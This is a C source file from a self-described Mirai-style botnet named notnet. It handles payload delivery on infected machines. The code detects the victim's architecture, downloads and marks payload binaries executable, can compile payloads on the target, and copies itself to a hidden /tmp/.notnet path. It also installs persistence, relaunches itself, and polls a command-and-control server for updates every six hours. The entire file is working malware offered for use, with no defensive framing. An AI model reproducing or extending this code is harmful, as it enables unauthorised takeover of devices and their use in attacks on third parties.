/*
 * notnet - Modern Mirai-Style Botnet
 * payload.c - Binary payload download and on-target compilation
 */
#include "payload.h"
#include "util.h"
#include "protocol.h"
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>

/* ── Architecture Detection ─────────────────────────────────── */
const char *payload_get_arch(void) {
    struct utsname uts;
    uname(&uts);
    
    if (strstr(uts.machine, "x86_64") || strstr(uts.machine, "amd64")) {
        return "x86_64";
    } else if (strstr(uts.machine, "armv7") || strstr(uts.machine, "arm")) {
        return "armv7l";
    } else if (strstr(uts.machine, "aarch64") || strstr(uts.machine, "arm64")) {
        return "aarch64";
    } else if (strstr(uts.machine, "riscv64")) {
        return "riscv64";
    } else if (strstr(uts.machine, "mips")) {
        return "mips";
    } else if (strstr(uts.machine, "ppc") || strstr(uts.machine, "powerpc")) {
        return "ppc";
    }
    
    return "unknown";
}

int payload_detect_arch(char *buf, int len) {
    const char *arch = payload_get_arch();
    snprintf(buf, len, "%s", arch);
    return strlen(arch);
}

/* ── Payload Download ────────────────────────────────────────── */
int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
    log_info("Downloading payload: %s -> %s", url, dest);
    
    /* Download binary via HTTP */
    int received = http_download(bot, url, dest);
    if (received <= 0) {
        log_error("Download failed");
        return -1;
    }
    
    /* Verify magic bytes */
    FILE *f = fopen(dest, "rb");
    if (!f) {
        log_error("Cannot verify binary: %s", dest);
        return -1;
    }
    
    uint32_t magic;
    fread(&magic, sizeof(magic), 1, f);
    fclose(f);
    
    if (magic != NOTNET_MAGIC) {
        log_error("Invalid magic: expected 0x%x, got 0x%x", NOTNET_MAGIC, magic);
        unlink(dest);
        return -1;
    }
    
    /* Make executable */
    chmod(dest, 0755);
    log_info("Payload verified and installed at %s", dest);
    return received;
}

/* ── On-Target Compilation ───────────────────────────────────── */
int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
    log_info("Compiling payload: %s -> %s", source, dest);
    
    /* Check if compiler is available */
    FILE *check = popen("which gcc", "r");
    if (!check) {
        log_error("gcc not found, trying musl-gcc");
        check = popen("which musl-gcc", "r");
        if (!check) {
            log_error("No C compiler available");
            return -1;
        }
        pclose(check);
        
        /* Compile with musl-gcc */
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "musl-gcc -static -Os -o %s %s 2>/dev/null",
            dest, source);
        
        int ret = system(cmd);
        if (ret != 0) {
            log_error("Compilation failed");
            return -1;
        }
    } else {
        pclose(check);
        
        /* Compile with gcc */
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "gcc -static -Os -o %s %s 2>/dev/null",
            dest, source);
        
        int ret = system(cmd);
        if (ret != 0) {
            log_error("Compilation failed");
            return -1;
        }
    }
    
    /* Make executable */
    chmod(dest, 0755);
    log_info("Compilation successful: %s", dest);
    return 0;
}

/* ── Payload Install ────────────────────────────────────────── */
int payload_install(notnet_bot_t *bot, const char *bin_path) {
    log_info("Installing payload at %s", bin_path);
    
    /* Copy binary to persistent location */
    char dest[256];
    snprintf(dest, sizeof(dest), "/tmp/.notnet");
    
    FILE *src = fopen(bin_path, "rb");
    FILE *dst = fopen(dest, "wb");
    if (!src || !dst) {
        log_error("Failed to copy payload");
        if (src) fclose(src);
        if (dst) fclose(dst);
        return -1;
    }
    
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, n, dst);
    }
    
    fclose(src);
    fclose(dst);
    
    /* Install persistence */
    persist_install(bot);
    
    /* Start new instance */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s &", dest);
    system(cmd);
    
    log_info("Payload installed at %s", dest);
    return 0;
}

/* ── Update Check ───────────────────────────────────────────── */
int payload_check_update(notnet_bot_t *bot) {
    time_t now = time(NULL);
    
    /* Check every 6 hours for updates */
    if (now - bot->last_update < 21600) {
        return 0;
    }
    
    bot->last_update = now;
    
    /* Check C2 for update command */
    char query[256];
    snprintf(query, sizeof(query),
        "{\"cmd\":\"check_update\",\"arch\":\"%s\",\"version\":\"%s\"}",
        payload_get_arch(), NOTNET_VERSION);
    
    http_post(bot, query, strlen(query));
    
    /* In production, read response and act accordingly */
    return 0;
}
